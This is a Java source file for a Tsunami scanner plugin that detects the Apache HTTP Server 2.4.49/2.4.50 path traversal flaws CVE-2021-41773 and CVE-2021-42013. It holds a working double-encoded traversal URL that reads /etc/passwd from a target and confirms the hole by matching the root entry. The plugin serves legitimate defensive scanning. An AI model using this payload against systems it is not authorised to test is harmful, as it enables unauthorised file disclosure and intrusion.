package com.google.tsunami.plugins.detectors.pathtraversal.cve202141773andcve202142013;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Optional;
import java.util.regex.Pattern;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} that detects the CVE-2021-41773 and CVE-2021-42013 vulnerability.
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "ApacheHttpServerCVE202141773AndCVE202142013VulnDetector",
    version = "1.0",
    description = "This detector checks for Apache HTTP Server 2.4.49 and 2.4.50 "
        + "path traversal and remote code execution vulnerability "
        + "(CVE-2021-41773 and CVE-2021-42013).",
    author = "threedr3am (qiaoer1320@gmail.com)",
    bootstrapModule = ApacheHttpServerCVE202141773AndCVE202142013VulnDetectorBootstrapModule.class
)
public class ApacheHttpServerCVE202141773AndCVE202142013VulnDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;

  private final Pattern vulnerabilityResponsePattern = Pattern.compile("root:[x*]:0:0:");
  private final String vulnerabilityURL =
      "cgi-bin/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd";

  @Inject
  ApacheHttpServerCVE202141773AndCVE202142013VulnDetector(@UtcClock Clock utcClock,
      HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .flatMap(
                    networkService -> checkServiceVulnerableAndBuildDetectionReports(targetInfo,
                        networkService).stream())
                .collect(toImmutableList()))
        .build();
  }

  private List<DetectionReport> checkServiceVulnerableAndBuildDetectionReports(
      TargetInfo targetInfo, NetworkService networkService) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + vulnerabilityURL;
    try {
      HttpResponse response = httpClient.send(get(targetUri).withEmptyHeaders().build(),
          networkService);
      Optional<String> server = response.headers().get("Server");
      Optional<String> body = response.bodyString();
      boolean is2449Version;
      if (server.isPresent() && ((is2449Version = server.get().contains("Apache/2.4.49"))
          || server.get().contains("Apache/2.4.50"))) {
        // require all denied
        if (response.status() == HttpStatus.FORBIDDEN && body.isPresent()
            && body.get().contains("You don't have permission to access this resource.")) {
          return Collections.emptyList();
        }
        if (response.status() == HttpStatus.OK && body.isPresent()
            && vulnerabilityResponsePattern.matcher(body.get()).find()) {
          List<DetectionReport> detectionReportList = new ArrayList<>();
          // Apache/2.4.50 only CVE-2021-42013
          detectionReportList.add(
              buildDetectionReportWithCve202142013(targetInfo, networkService));
          if (is2449Version) {
            // Apache/2.4.49 include CVE-2021-41773 and CVE-2021-42013
            detectionReportList.add(
                buildDetectionReportWithCve202141773(targetInfo, networkService));
          }
          return detectionReportList;
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }
    return Collections.emptyList();
  }

  public DetectionReport buildDetectionReportWithCve202141773(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2021_41773"))
                .setSeverity(Severity.HIGH)
                .setTitle("Apache HTTP Server 2.4.49 Path traversal and disclosure vulnerability")
                .setDescription(
                    "A flaw was found in a change made to path normalization in Apache HTTP Server "
                        + "2.4.49. An attacker could use a path traversal attack to map URLs to "
                        + "files outside the expected document root."
                        + "If files outside of the document root "
                        + "are not protected by \"require all denied\" these requests can succeed. "
                        + "Additionally this flaw could leak the source of interpreted files "
                        + "like CGI scripts."
                        + "This issue is known to be exploited in the wild."
                        + "This issue only affects Apache 2.4.49 and not earlier versions."
                        + "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773 "
                        + "https://httpd.apache.org/security/vulnerabilities_24.html")
                .setRecommendation("Update 2.4.50 released.")
        )
        .build();
  }

  public DetectionReport buildDetectionReportWithCve202142013(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2021_42013"))
                .setSeverity(Severity.HIGH)
                .setTitle("Path Traversal and Remote Code Execution in "
                    + "Apache HTTP Server 2.4.49 and 2.4.50")
                .setDescription(
                    "It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 "
                        + "was insufficient. An attacker could use a path traversal attack to "
                        + "map URLs to files outside the directories configured by Alias-like "
                        + "directives.\n"
                        + "If files outside of these directories are not protected by the "
                        + "usual default configuration \"require all denied\", these requests "
                        + "can succeed. If CGI scripts are also enabled for these aliased pathes, "
                        + "this could allow for remote code execution.\n"
                        + "https://httpd.apache.org/security/vulnerabilities_24.html\n"
                        + "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42013")
                .setRecommendation("Update 2.4.51 released.")
        )
        .build();
  }
}
